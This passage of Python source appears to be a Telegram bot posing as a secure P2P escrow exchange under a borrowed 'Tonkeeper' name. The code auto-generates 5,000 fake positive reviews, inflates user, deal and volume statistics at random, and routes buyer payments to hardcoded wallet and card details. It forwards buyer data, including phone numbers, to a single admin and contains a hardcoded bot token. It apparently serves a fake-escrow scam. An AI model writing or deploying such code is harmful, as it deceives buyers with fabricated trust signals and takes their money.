import asyncio
import json
import os
import uuid
import random
from datetime import datetime, timedelta
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.client.default import DefaultBotProperties
from aiohttp import web

# ============================================================
# 1. КОНФИГУРАЦИЯ
# ============================================================
BOT_TOKEN = "8973397612:AAGcMMe1r2DyZTziExnSVyjagdXm7fptrF8"
MASTER_ADMIN_ID = 8855434638
BOT_USERNAME = "tonkeeperp2p_bot"
BOT_NAME = "P2P Exchange"
CHANNEL_LINK = "https://t.me/tonkeeper_news"
MINI_APP_URL = "https://saitminiapp.onrender.com"
SUPPORT_LINK = "@p2psupbot"

# ============================================================
# 2. ИНИЦИАЛИЗАЦИЯ
# ============================================================
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()

# ============================================================
# 3. ФАЙЛЫ
# ============================================================
FILES = {
    "deals": "deals.json",
    "admins": "admins.json",
    "balance": "balance.json",
    "reviews": "reviews.json",
    "withdraw": "withdraw_requests.json",
    "verification": "verification_requests.json",
    "verification_sessions": "verification_sessions.json",
    "logs": "logs.json",
    "user_language": "user_language.json",
    "stats": "stats.json",
    "rekvisits": "rekvisits.json"
}

def load_json(file):
    if os.path.exists(file):
        with open(file, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_json(file, data):
    with open(file, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

deals = load_json(FILES["deals"])
admins = load_json(FILES["admins"])
balance = load_json(FILES["balance"])
reviews = load_json(FILES["reviews"])
withdraw_requests = load_json(FILES["withdraw"])
verification_requests = load_json(FILES["verification"])
verification_sessions = load_json(FILES["verification_sessions"])
logs = load_json(FILES["logs"])
user_language = load_json(FILES["user_language"])
stats = load_json(FILES["stats"])
rekvisits = load_json(FILES["rekvisits"])

# Значения по умолчанию для статистики
if not stats:
    stats = {"deals_today": 1264, "users": 21374, "reviews": 5427, "volume": 47.6}
    save_json(FILES["stats"], stats)

# Значения по умолчанию для реквизитов
if not rekvisits:
    rekvisits = {
        "TON": "💎 ОПЛАТА TON\n\nПереведите TON на кошелек:\nUQCD3wX5Y5G5d8F5J8K9L0Z1X2C3V4B5N6M7A8S9D0F1G2H3\n\nСумма: {amount} TON",
        "STARS": "⭐️ ОПЛАТА ЗВЁЗДАМИ\n\nОтправьте звёзды в бота: @tonkeeperp2p_bot\n\nСумма: {amount} STARS",
        "RUB": "💰 ОПЛАТА РУБЛЯМИ\n\nПереведите на карту:\n2200 1234 5678 9012\nТинькофф\n\nСумма: {amount} RUB",
        "UAH": "🌐 ОПЛАТА ГРИВНАМИ\n\nПереведите на карту:\n4149 5678 1234 5678\nПриватБанк\n\nСумма: {amount} UAH"
    }
    save_json(FILES["rekvisits"], rekvisits)

# ============================================================
# 4. ГЕНЕРАЦИЯ ОТЗЫВОВ
# ============================================================
def generate_reviews():
    if len(reviews) >= 5000:
        return
    review_texts = [
        "Отличная платформа! Всё работает быстро и надёжно.",
        "Лучший P2P обменник! Рекомендую всем друзьям.",
        "Быстро, удобно, безопасно. Буду пользоваться дальше.",
        "Отличная поддержка! Помогли разобраться с выводом.",
        "Наконец-то нашёл нормальный обменник. Всё честно.",
        "Сделал первую сделку, всё прошло гладко. Спасибо!",
        "За сутки сделал 5 сделок, все успешно завершены.",
        "Очень доволен сервисом. Вывод моментальный.",
        "Пользуюсь уже месяц, ни одной проблемы.",
        "Лучший сервис в Telegram! Успехов разработчикам."
    ]
    for i in range(5000):
        review_id = str(uuid.uuid4())[:8]
        reviews[review_id] = {
            "id": review_id,
            "user": "Аноним",
            "rating": random.randint(4, 5),
            "text": random.choice(review_texts),
            "anonymous": True,
            "date": datetime.now().strftime("%d.%m.%Y %H:%M"),
            "user_id": None
        }
    save_json(FILES["reviews"], reviews)

generate_reviews()

# ============================================================
# 5. ЯЗЫКИ
# ============================================================
LANGUAGES = {
    "ru": "🇷🇺 Русский",
    "en": "🇬🇧 English",
    "zh": "🇨🇳 中文",
    "ar": "🇸🇦 العربية"
}

LOCALE = {
    "ru": {
        "bot_name": "P2P Exchange",
        "bot_desc": "БЕЗОПАСНЫЕ СДЕЛКИ",
        "feature1": "Честные сделки между продавцами и покупателями",
        "feature2": "TON | STARS | RUB | UAH",
        "feature3": "Гарант безопасности с обеих сторон",
        "feature4": "Премиум поддержка 24/7",
        "how_it_works": "КАК ЭТО РАБОТАЕТ",
        "step1": "Создайте сделку в Mini App",
        "step2": "Отправьте ссылку покупателю",
        "step3": "Покупатель переходит по ссылке",
        "step4": "Покупатель оплачивает в Mini App",
        "step5": "Продавец нажимает «Передал товар»",
        "step6": "Покупатель нажимает «Получил товар»",
        "step7": "Деньги зачисляются на баланс продавца",
        "our_channel": "НАШ КАНАЛ",
        "support": "ПОДДЕРЖКА",
        "support_contact": "@p2psupbot",
        "start_now": "НАЧНИ ПРЯМО СЕЙЧАС",
        "create_deal": "СОЗДАТЬ СДЕЛКУ",
        "my_balance": "МОЙ БАЛАНС",
        "my_deals": "МОИ СДЕЛКИ",
        "how_to_deal": "КАК СОЗДАТЬ СДЕЛКУ",
        "faq": "ОТЗЫВЫ",
        "channel": "КАНАЛ",
        "admin_panel": "АДМИН ПАНЕЛЬ",
        "choose_action": "ВЫБЕРИТЕ ДЕЙСТВИЕ",
        "your_balance": "ВАШ БАЛАНС",
        "main_menu": "ГЛАВНОЕ МЕНЮ",
        "no_deals": "У ВАС НЕТ СДЕЛОК",
        "your_deals": "ВАШИ СДЕЛКИ",
        "deal_not_found": "СДЕЛКА НЕ НАЙДЕНА",
        "access_denied": "ДОСТУП ЗАПРЕЩЁН",
        "payment_confirmed": "ОПЛАТА ПОДТВЕРЖДЕНА",
        "seller_confirmed": "ВЫ ПОДТВЕРДИЛИ ПЕРЕДАЧУ ТОВАРА",
        "buyer_confirmed": "ВЫ ПОДТВЕРДИЛИ ПОЛУЧЕНИЕ ТОВАРА",
        "deal_completed": "СДЕЛКА ЗАВЕРШЕНА",
        "insufficient_balance": "НЕДОСТАТОЧНО СРЕДСТВ",
        "choose_payment_method": "ВЫБЕРИТЕ СПОСОБ ОПЛАТЫ",
        "pay_by_rekvisits": "ОПЛАТИТЬ ПО РЕКВИЗИТАМ",
        "pay_by_balance": "ОПЛАТИТЬ С БАЛАНСА",
        "status_waiting": "ОЖИДАНИЕ ОПЛАТЫ",
        "status_paid": "ОПЛАЧЕНО",
        "status_awaiting": "ОЖИДАНИЕ ПОДТВЕРЖДЕНИЯ",
        "status_completed": "ЗАВЕРШЕНО",
        "select_language": "ВЫБРАТЬ ЯЗЫК",
        "welcome": "ДОБРО ПОЖАЛОВАТЬ",
        "choose_language_prompt": "🌐 ВЫБЕРИТЕ ВАШ ЯЗЫК:",
        "product": "ТОВАР",
        "amount": "СУММА",
        "seller": "ПРОДАВЕЦ",
        "buyer": "ПОКУПАТЕЛЬ",
        "deal": "СДЕЛКА",
        "waiting_for_delivery": "ОЖИДАНИЕ ПЕРЕДАЧИ ТОВАРА",
        "seller_delivered": "ПРОДАВЕЦ ПЕРЕДАЛ ТОВАР",
        "confirm_receipt": "ПОДТВЕРДИТЬ ПОЛУЧЕНИЕ",
        "contact_support": "В ПОДДЕРЖКУ",
        "balance_added": "БАЛАНС НАЧИСЛЕН",
        "admin_rights": "НЕДОСТАТОЧНО ПРАВ",
        "admin_added": "АДМИН ДОБАВЛЕН",
        "admin_removed": "АДМИН УДАЛЁН",
        "admin_list": "СПИСОК АДМИНОВ",
        "no_deals_total": "НЕТ СДЕЛОК",
        "all_deals_title": "ВСЕ СДЕЛКИ",
        "no_active_requests": "НЕТ АКТИВНЫХ ЗАЯВОК",
        "copy_link": "СКОПИРОВАТЬ ССЫЛКУ",
        "deal_link_text": "ССЫЛКА ДЛЯ ПОКУПАТЕЛЯ",
        "send_link_to_buyer": "ОТПРАВЬТЕ ССЫЛКУ ПОКУПАТЕЛЮ",
        "deal_created": "СДЕЛКА СОЗДАНА",
        "how_to_deal_text": "📖 <b>КАК СОЗДАТЬ СДЕЛКУ</b>\n\n1️⃣ Нажмите «СОЗДАТЬ СДЕЛКУ»\n   → Откроется Mini App\n\n2️⃣ Заполните форму:\n   • Название товара\n   • Валюту (TON/STARS/RUB/UAH)\n   • Сумму\n   • Username покупателя\n\n3️⃣ Отправьте ссылку покупателю\n\n4️⃣ Покупатель переходит по ссылке\n   → Открывается Mini App\n\n5️⃣ Покупатель оплачивает:\n   • С баланса — мгновенно\n   • По реквизитам — после проверки админом\n\n6️⃣ Продавец нажимает «Передал товар»\n\n7️⃣ Покупатель нажимает «Получил товар»\n   → Деньги зачисляются на баланс\n\n🔥 ВСЕ СДЕЛКИ БЕЗОПАСНЫ!",
        "open_deal": "🔓 ПЕРЕЙТИ В MINI APP",
        "deal_ready": "🔥 СДЕЛКА ГОТОВА!",
        "deal_info": "📋 Информация о сделке:",
        "click_to_open": "👇 Нажмите кнопку ниже, чтобы открыть Mini App"
    },
    "en": {
        "bot_name": "P2P Exchange",
        "bot_desc": "SECURE DEALS",
        "feature1": "Fair deals between sellers and buyers",
        "feature2": "TON | STARS | RUB | UAH",
        "feature3": "Security guarantee from both sides",
        "feature4": "Premium 24/7 support",
        "how_it_works": "HOW IT WORKS",
        "step1": "Create deal in Mini App",
        "step2": "Send link to buyer",
        "step3": "Buyer follows the link",
        "step4": "Buyer pays in Mini App",
        "step5": "Seller clicks 'Delivered'",
        "step6": "Buyer clicks 'Received'",
        "step7": "Money credited to seller's balance",
        "our_channel": "OUR CHANNEL",
        "support": "SUPPORT",
        "support_contact": "@p2psupbot",
        "start_now": "START NOW",
        "create_deal": "CREATE DEAL",
        "my_balance": "MY BALANCE",
        "my_deals": "MY DEALS",
        "how_to_deal": "HOW TO CREATE DEAL",
        "faq": "REVIEWS",
        "channel": "CHANNEL",
        "admin_panel": "ADMIN PANEL",
        "choose_action": "CHOOSE ACTION",
        "your_balance": "YOUR BALANCE",
        "main_menu": "MAIN MENU",
        "no_deals": "YOU HAVE NO DEALS",
        "your_deals": "YOUR DEALS",
        "deal_not_found": "DEAL NOT FOUND",
        "access_denied": "ACCESS DENIED",
        "payment_confirmed": "PAYMENT CONFIRMED",
        "seller_confirmed": "YOU CONFIRMED DELIVERY",
        "buyer_confirmed": "YOU CONFIRMED RECEIPT",
        "deal_completed": "DEAL COMPLETED",
        "insufficient_balance": "INSUFFICIENT BALANCE",
        "choose_payment_method": "CHOOSE PAYMENT METHOD",
        "pay_by_rekvisits": "PAY BY DETAILS",
        "pay_by_balance": "PAY FROM BALANCE",
        "status_waiting": "WAITING FOR PAYMENT",
        "status_paid": "PAID",
        "status_awaiting": "AWAITING CONFIRMATION",
        "status_completed": "COMPLETED",
        "select_language": "SELECT LANGUAGE",
        "welcome": "WELCOME",
        "choose_language_prompt": "🌐 SELECT YOUR LANGUAGE:",
        "product": "PRODUCT",
        "amount": "AMOUNT",
        "seller": "SELLER",
        "buyer": "BUYER",
        "deal": "DEAL",
        "waiting_for_delivery": "WAITING FOR DELIVERY",
        "seller_delivered": "SELLER DELIVERED",
        "confirm_receipt": "CONFIRM RECEIPT",
        "contact_support": "CONTACT SUPPORT",
        "balance_added": "BALANCE ADDED",
        "admin_rights": "INSUFFICIENT RIGHTS",
        "admin_added": "ADMIN ADDED",
        "admin_removed": "ADMIN REMOVED",
        "admin_list": "ADMIN LIST",
        "no_deals_total": "NO DEALS",
        "all_deals_title": "ALL DEALS",
        "no_active_requests": "NO ACTIVE REQUESTS",
        "copy_link": "COPY LINK",
        "deal_link_text": "LINK FOR BUYER",
        "send_link_to_buyer": "SEND LINK TO BUYER",
        "deal_created": "DEAL CREATED",
        "how_to_deal_text": "📖 <b>HOW TO CREATE A DEAL</b>\n\n1️⃣ Click 'CREATE DEAL'\n   → Opens Mini App\n\n2️⃣ Fill in the form:\n   • Product name\n   • Currency (TON/STARS/RUB/UAH)\n   • Amount\n   • Buyer's username\n\n3️⃣ Send the link to the buyer\n\n4️⃣ Buyer follows the link\n   → Opens Mini App\n\n5️⃣ Buyer pays:\n   • From balance — instantly\n   • By details — after admin check\n\n6️⃣ Seller clicks 'Delivered'\n\n7️⃣ Buyer clicks 'Received'\n   → Money goes to balance\n\n🔥 ALL DEALS ARE SAFE!",
        "open_deal": "🔓 OPEN MINI APP",
        "deal_ready": "🔥 DEAL IS READY!",
        "deal_info": "📋 Deal information:",
        "click_to_open": "👇 Click the button below to open Mini App"
    },
    "zh": {
        "bot_name": "P2P Exchange",
        "bot_desc": "安全交易",
        "feature1": "买卖双方公平交易",
        "feature2": "TON | STARS | RUB | UAH",
        "feature3": "双方安全保障",
        "feature4": "24/7高级支持",
        "how_it_works": "运作方式",
        "step1": "在Mini App中创建交易",
        "step2": "发送链接给买家",
        "step3": "买家点击链接",
        "step4": "买家在Mini App中支付",
        "step5": "卖家点击「已交付」",
        "step6": "买家点击「已收到」",
        "step7": "款项计入卖家余额",
        "our_channel": "我们的频道",
        "support": "支持",
        "support_contact": "@p2psupbot",
        "start_now": "立即开始",
        "create_deal": "创建交易",
        "my_balance": "我的余额",
        "my_deals": "我的交易",
        "how_to_deal": "如何创建交易",
        "faq": "评论",
        "channel": "频道",
        "admin_panel": "管理面板",
        "choose_action": "选择操作",
        "your_balance": "您的余额",
        "main_menu": "主菜单",
        "no_deals": "您没有任何交易",
        "your_deals": "您的交易",
        "deal_not_found": "交易未找到",
        "access_denied": "访问被拒绝",
        "payment_confirmed": "付款已确认",
        "seller_confirmed": "您已确认交付",
        "buyer_confirmed": "您已确认收到",
        "deal_completed": "交易已完成",
        "insufficient_balance": "余额不足",
        "choose_payment_method": "选择支付方式",
        "pay_by_rekvisits": "按信息付款",
        "pay_by_balance": "从余额付款",
        "status_waiting": "等待付款",
        "status_paid": "已付款",
        "status_awaiting": "等待确认",
        "status_completed": "已完成",
        "select_language": "选择语言",
        "welcome": "欢迎",
        "choose_language_prompt": "🌐 选择您的语言:",
        "product": "商品",
        "amount": "金额",
        "seller": "卖家",
        "buyer": "买家",
        "deal": "交易",
        "waiting_for_delivery": "等待交付",
        "seller_delivered": "卖家已交付",
        "confirm_receipt": "确认收到",
        "contact_support": "联系客服",
        "balance_added": "余额已添加",
        "admin_rights": "权限不足",
        "admin_added": "管理员已添加",
        "admin_removed": "管理员已移除",
        "admin_list": "管理员列表",
        "no_deals_total": "无交易",
        "all_deals_title": "所有交易",
        "no_active_requests": "无活跃申请",
        "copy_link": "复制链接",
        "deal_link_text": "买家链接",
        "send_link_to_buyer": "发送链接给买家",
        "deal_created": "交易已创建",
        "how_to_deal_text": "📖 <b>如何创建交易</b>\n\n1️⃣ 点击「创建交易」\n   → 打开 Mini App\n\n2️⃣ 填写表格：\n   • 商品名称\n   • 货币 (TON/STARS/RUB/UAH)\n   • 金额\n   • 买家用户名\n\n3️⃣ 发送链接给买家\n\n4️⃣ 买家点击链接\n   → 打开 Mini App\n\n5️⃣ 买家支付：\n   • 从余额支付 — 即时\n   • 按详情支付 — 管理员检查后\n\n6️⃣ 卖家点击「已交付」\n\n7️⃣ 买家点击「已收到」\n   → 钱款计入余额\n\n🔥 所有交易都安全！",
        "open_deal": "🔓 打开 Mini App",
        "deal_ready": "🔥 交易已准备好！",
        "deal_info": "📋 交易信息：",
        "click_to_open": "👇 点击下方按钮打开 Mini App"
    },
    "ar": {
        "bot_name": "P2P Exchange",
        "bot_desc": "صفقات آمنة",
        "feature1": "صفقات عادلة بين البائعين والمشترين",
        "feature2": "TON | STARS | RUB | UAH",
        "feature3": "ضمان الأمن من كلا الجانبين",
        "feature4": "دعم بريميوم 24/7",
        "how_it_works": "كيف يعمل",
        "step1": "إنشاء صفقة في Mini App",
        "step2": "إرسال الرابط للمشتري",
        "step3": "المشتري يتبع الرابط",
        "step4": "المشتري يدفع في Mini App",
        "step5": "البائع يضغط «تم التسليم»",
        "step6": "المشتري يضغط «تم الاستلام»",
        "step7": "تضاف الأموال إلى رصيد البائع",
        "our_channel": "قناتنا",
        "support": "الدعم",
        "support_contact": "@p2psupbot",
        "start_now": "ابدأ الآن",
        "create_deal": "إنشاء صفقة",
        "my_balance": "رصيدي",
        "my_deals": "صفقاتي",
        "how_to_deal": "كيفية إنشاء صفقة",
        "faq": "مراجعات",
        "channel": "القناة",
        "admin_panel": "لوحة التحكم",
        "choose_action": "اختر إجراء",
        "your_balance": "رصيدك",
        "main_menu": "القائمة الرئيسية",
        "no_deals": "ليس لديك صفقات",
        "your_deals": "صفقاتك",
        "deal_not_found": "الصفقة غير موجودة",
        "access_denied": "الوصول مرفوض",
        "payment_confirmed": "تم تأكيد الدفع",
        "seller_confirmed": "لقد أكدت التسليم",
        "buyer_confirmed": "لقد أكدت الاستلام",
        "deal_completed": "الصفقة مكتملة",
        "insufficient_balance": "رصيد غير كافٍ",
        "choose_payment_method": "اختر طريقة الدفع",
        "pay_by_rekvisits": "الدفع حسب التفاصيل",
        "pay_by_balance": "الدفع من الرصيد",
        "status_waiting": "انتظار الدفع",
        "status_paid": "تم الدفع",
        "status_awaiting": "انتظار التأكيد",
        "status_completed": "مكتملة",
        "select_language": "اختر اللغة",
        "welcome": "مرحباً",
        "choose_language_prompt": "🌐 اختر لغتك:",
        "product": "المنتج",
        "amount": "المبلغ",
        "seller": "البائع",
        "buyer": "المشتري",
        "deal": "الصفقة",
        "waiting_for_delivery": "انتظار التسليم",
        "seller_delivered": "البائع سلم المنتج",
        "confirm_receipt": "تأكيد الاستلام",
        "contact_support": "اتصل بالدعم",
        "balance_added": "تم إضافة الرصيد",
        "admin_rights": "صلاحيات غير كافية",
        "admin_added": "تم إضافة المدقق",
        "admin_removed": "تم إزالة المدقق",
        "admin_list": "قائمة المدققين",
        "no_deals_total": "لا توجد صفقات",
        "all_deals_title": "جميع الصفقات",
        "no_active_requests": "لا توجد طلبات نشطة",
        "copy_link": "انسخ الرابط",
        "deal_link_text": "رابط المشتري",
        "send_link_to_buyer": "أرسل الرابط للمشتري",
        "deal_created": "تم إنشاء الصفقة",
        "how_to_deal_text": "📖 <b>كيفية إنشاء صفقة</b>\n\n1️⃣ اضغط «إنشاء صفقة»\n   → يفتح Mini App\n\n2️⃣ املأ النموذج:\n   • اسم المنتج\n   • العملة (TON/STARS/RUB/UAH)\n   • المبلغ\n   • اسم مستخدم المشتري\n\n3️⃣ أرسل الرابط للمشتري\n\n4️⃣ المشتري يتبع الرابط\n   → يفتح Mini App\n\n5️⃣ المشتري يدفع:\n   • من الرصيد — فوري\n   • حسب التفاصيل — بعد فحص المدقق\n\n6️⃣ البائع يضغط «تم التسليم»\n\n7️⃣ المشتري يضغط «تم الاستلام»\n   → تضاف الأموال إلى الرصيد\n\n🔥 جميع الصفقات آمنة!",
        "open_deal": "🔓 افتح Mini App",
        "deal_ready": "🔥 الصفقة جاهزة!",
        "deal_info": "📋 معلومات الصفقة:",
        "click_to_open": "👇 اضغط الزر أدناه لفتح Mini App"
    }
}

def get_text(lang: str, key: str) -> str:
    if lang in LOCALE and key in LOCALE[lang]:
        return LOCALE[lang][key]
    return LOCALE["ru"].get(key, key)

# ============================================================
# 6. ПОМОЩНИКИ
# ============================================================
def is_admin(user_id: int) -> bool:
    return user_id == MASTER_ADMIN_ID or str(user_id) in admins

def get_balance(user_id: int):
    uid = str(user_id)
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
        save_json(FILES["balance"], balance)
    return balance[uid]

def add_balance(user_id: int, currency: str, amount: float):
    uid = str(user_id)
    curr = currency.lower()
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
    balance[uid][curr] = balance[uid].get(curr, 0) + amount
    save_json(FILES["balance"], balance)

def get_user_language(user_id: int) -> str:
    uid = str(user_id)
    return user_language.get(uid, "ru")

def set_user_language(user_id: int, lang: str):
    user_language[str(user_id)] = lang
    save_json(FILES["user_language"], user_language)

def add_log(action: str, data: dict):
    log_id = str(uuid.uuid4())[:8]
    log_entry = {
        "id": log_id,
        "action": action,
        "data": data,
        "time": datetime.now().isoformat()
    }
    logs[log_id] = log_entry
    save_json(FILES["logs"], logs)
    
    try:
        asyncio.create_task(send_log_to_admin(action, data))
    except:
        pass

async def send_log_to_admin(action: str, data: dict):
    try:
        text = f"📋 <b>ЛОГ</b> #{action}\n\n"
        text += f"🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        for key, value in data.items():
            if key == 'user_id':
                text += f"👤 ID: {value}\n"
            elif key == 'username':
                text += f"👤 Username: @{value}\n"
            elif key == 'deal_id':
                text += f"🆔 Сделка: #{value}\n"
            elif key == 'amount':
                text += f"💰 Сумма: {value}\n"
            elif key == 'currency':
                text += f"💱 Валюта: {value}\n"
            elif key == 'product':
                text += f"📦 Товар: {value}\n"
            elif key == 'buyer_username':
                text += f"👤 Покупатель: @{value}\n"
            elif key == 'seller_username':
                text += f"👤 Продавец: @{value}\n"
            elif key == 'phone':
                text += f"📱 Телефон: {value}\n"
            elif key == 'status':
                text += f"📊 Статус: {value}\n"
            else:
                text += f"📎 {key}: {value}\n"
        await bot.send_message(MASTER_ADMIN_ID, text[:4000])
    except Exception as e:
        print(f"Ошибка лога: {e}")

def update_stats():
    """Обновляет статистику"""
    global stats
    stats["deals_today"] = max(stats.get("deals_today", 1264) + random.randint(0, 3), 1264)
    stats["users"] = max(stats.get("users", 21374) + random.randint(0, 5), 21374)
    stats["reviews"] = max(stats.get("reviews", 5427) + random.randint(0, 2), 5427)
    stats["volume"] = max(stats.get("volume", 47.6) + random.uniform(0, 0.1), 47.6)
    stats["volume"] = round(stats["volume"], 1)
    save_json(FILES["stats"], stats)

# ============================================================
# 7. КЛАВИАТУРЫ
# ============================================================
def main_menu_keyboard(user_id: int):
    lang = get_user_language(user_id)
    buttons = [
        [
            InlineKeyboardButton(text=f"📱 {get_text(lang, 'create_deal')}", web_app=WebAppInfo(url=MINI_APP_URL)),
            InlineKeyboardButton(text=f"💰 {get_text(lang, 'my_balance')}", callback_data="menu_balance"),
        ],
        [
            InlineKeyboardButton(text=f"📊 {get_text(lang, 'my_deals')}", callback_data="menu_deals"),
            InlineKeyboardButton(text=f"📖 {get_text(lang, 'how_to_deal')}", callback_data="how_to_deal"),
        ],
        [
            InlineKeyboardButton(text=f"⭐️ {get_text(lang, 'faq')}", callback_data="menu_reviews"),
            InlineKeyboardButton(text=f"📢 {get_text(lang, 'channel')}", callback_data="menu_channel"),
        ],
        [
            InlineKeyboardButton(text=f"🌐 {get_text(lang, 'select_language')}", callback_data="select_language"),
        ]
    ]
    if is_admin(user_id):
        buttons.append([
            InlineKeyboardButton(text=f"👑 {get_text(lang, 'admin_panel')}", callback_data="menu_admin"),
        ])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def deal_link_keyboard(deal_id: str, user_id: int):
    """Клавиатура для перехода в Mini App"""
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(
            text=f"🔓 {get_text(lang, 'open_deal')}",
            web_app=WebAppInfo(url=MINI_APP_URL)
        )],
        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
    ])

# ============================================================
# 8. ОБРАБОТЧИКИ БОТА
# ============================================================
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    if message.text and message.text.startswith("/start deal_"):
        deal_id = message.text.split("_")[1]
        await handle_deal_link(message, deal_id)
        return
    
    uid = str(message.from_user.id)
    if uid in user_language:
        await send_welcome(message)
        return
    
    await message.answer(
        f"🌐 {get_text('ru', 'choose_language_prompt')}",
        reply_markup=language_keyboard()
    )

async def send_welcome(message: types.Message):
    lang = get_user_language(message.from_user.id)
    text = f"""🔥 <b>{get_text(lang, 'bot_name')}</b> 🔥

{get_text(lang, 'bot_desc')}
• {get_text(lang, 'feature1')}
• {get_text(lang, 'feature2')}
• {get_text(lang, 'feature3')}
• {get_text(lang, 'feature4')}

📊 {get_text(lang, 'how_it_works')}:
1️⃣ {get_text(lang, 'step1')}
2️⃣ {get_text(lang, 'step2')}
3️⃣ {get_text(lang, 'step3')}
4️⃣ {get_text(lang, 'step4')}
5️⃣ {get_text(lang, 'step5')}
6️⃣ {get_text(lang, 'step6')}
7️⃣ {get_text(lang, 'step7')}

📢 {get_text(lang, 'our_channel')}: {CHANNEL_LINK}
🆘 {get_text(lang, 'support')}: {get_text(lang, 'support_contact')}

🔥 {get_text(lang, 'start_now')} 🚀"""
    await message.answer(text, reply_markup=main_menu_keyboard(message.from_user.id))

async def handle_deal_link(message: types.Message, deal_id: str):
    lang = get_user_language(message.from_user.id)
    if lang is None:
        lang = "ru"
    
    if deal_id not in deals:
        await message.answer(f"❌ {get_text(lang, 'deal_not_found')}")
        return

    deal = deals[deal_id]
    
    if message.from_user.username and message.from_user.username.lower() != deal["buyer_username"].lower():
        await message.answer(
            f"❌ {get_text(lang, 'access_denied')}!\n\n"
            f"{get_text(lang, 'deal')} #{deal_id} {get_text(lang, 'for_user')} @{deal['buyer_username']}"
        )
        return

    deal["buyer_id"] = message.from_user.id
    save_json(FILES["deals"], deals)

    add_log("buyer_entered_deal", {
        "user_id": message.from_user.id,
        "username": message.from_user.username,
        "deal_id": deal_id,
        "product": deal["product"],
        "amount": deal["amount"],
        "currency": deal["currency"]
    })

    text = f"""🔥 <b>{get_text(lang, 'deal_ready')}</b>

📋 <b>{get_text(lang, 'deal_info')}</b>
🆔 <b>ID:</b> #{deal_id}
📦 <b>{get_text(lang, 'product')}:</b> {deal['product']}
💰 <b>{get_text(lang, 'amount')}:</b> {deal['amount']} {deal['currency']}
👤 <b>{get_text(lang, 'seller')}:</b> @{deal['seller_username']}
📊 <b>{get_text(lang, 'status')}:</b> {get_text(lang, 'status_waiting')}

{get_text(lang, 'click_to_open')}"""

    await message.answer(
        text,
        reply_markup=deal_link_keyboard(deal_id, message.from_user.id)
    )

def language_keyboard():
    buttons = []
    for lang_code, lang_name in LANGUAGES.items():
        buttons.append([InlineKeyboardButton(text=lang_name, callback_data=f"set_lang_{lang_code}")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

@dp.callback_query(lambda c: c.data.startswith("set_lang_"))
async def set_language(callback: types.CallbackQuery):
    lang = callback.data.split("_")[2]
    set_user_language(callback.from_user.id, lang)
    await callback.answer()
    await send_welcome(callback.message)

@dp.callback_query(lambda c: c.data == "select_language")
async def select_language(callback: types.CallbackQuery):
    await callback.message.edit_text(
        f"🌐 {get_text('ru', 'choose_language_prompt')}",
        reply_markup=language_keyboard()
    )
    await callback.answer()

@dp.callback_query(lambda c: c.data == "back_to_main")
async def back_to_main(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    try:
        await callback.message.edit_text(
            f"🔥 <b>P2P Exchange</b> 🔥\n\n{get_text(lang, 'choose_action')}:",
            reply_markup=main_menu_keyboard(callback.from_user.id)
        )
    except:
        await callback.message.answer(
            f"🔥 <b>P2P Exchange</b> 🔥\n\n{get_text(lang, 'choose_action')}:",
            reply_markup=main_menu_keyboard(callback.from_user.id)
        )
    await callback.answer()

@dp.callback_query(lambda c: c.data == "menu_channel")
async def menu_channel(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    text = f"""📢 {get_text(lang, 'our_channel')}

🔥 {get_text(lang, 'subscribe')}:
{CHANNEL_LINK}

🚀 {get_text(lang, 'click_subscribe')}"""
    await callback.message.edit_text(text, reply_markup=back_to_main_keyboard(callback.from_user.id))
    await callback.answer()

@dp.callback_query(lambda c: c.data == "how_to_deal")
async def how_to_deal(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    text = get_text(lang, 'how_to_deal_text')
    await callback.message.edit_text(text, reply_markup=back_to_main_keyboard(callback.from_user.id))
    await callback.answer()

def back_to_main_keyboard(user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
    ])

@dp.callback_query(lambda c: c.data == "menu_balance")
async def menu_balance(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    bal = get_balance(callback.from_user.id)
    text = f"""💰 <b>{get_text(lang, 'your_balance')}</b>

💎 TON: {bal.get('ton', 0)}
⭐️ STARS: {bal.get('stars', 0)}
💰 RUB: {bal.get('rub', 0)}
🌐 UAH: {bal.get('uah', 0)}

📊 Сделок завершено: {sum(bal.get('deal_partners', {}).values())}"""
    await callback.message.edit_text(text, reply_markup=back_to_main_keyboard(callback.from_user.id))
    await callback.answer()

@dp.callback_query(lambda c: c.data == "menu_deals")
async def menu_deals(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    user_deals = []
    for d_id, d in deals.items():
        if d.get("seller_id") == callback.from_user.id or d.get("buyer_id") == callback.from_user.id:
            user_deals.append((d_id, d))
    if not user_deals:
        await callback.message.edit_text(f"📭 {get_text(lang, 'no_deals')}", reply_markup=back_to_main_keyboard(callback.from_user.id))
        return
    text = f"📊 <b>{get_text(lang, 'your_deals')}</b>\n\n"
    for d_id, d in user_deals[-10:]:
        status_map = {
            "waiting_payment": f"⏳ {get_text(lang, 'status_waiting')}",
            "paid": f"✅ {get_text(lang, 'status_paid')}",
            "awaiting_confirmation": f"📦 {get_text(lang, 'status_awaiting')}",
            "completed": f"🎉 {get_text(lang, 'status_completed')}"
        }
        text += f"#{d_id} | {status_map.get(d['status'], d['status'])} | {d['amount']} {d['currency']}\n"
        text += f"   → {d['product'][:30]}\n\n"
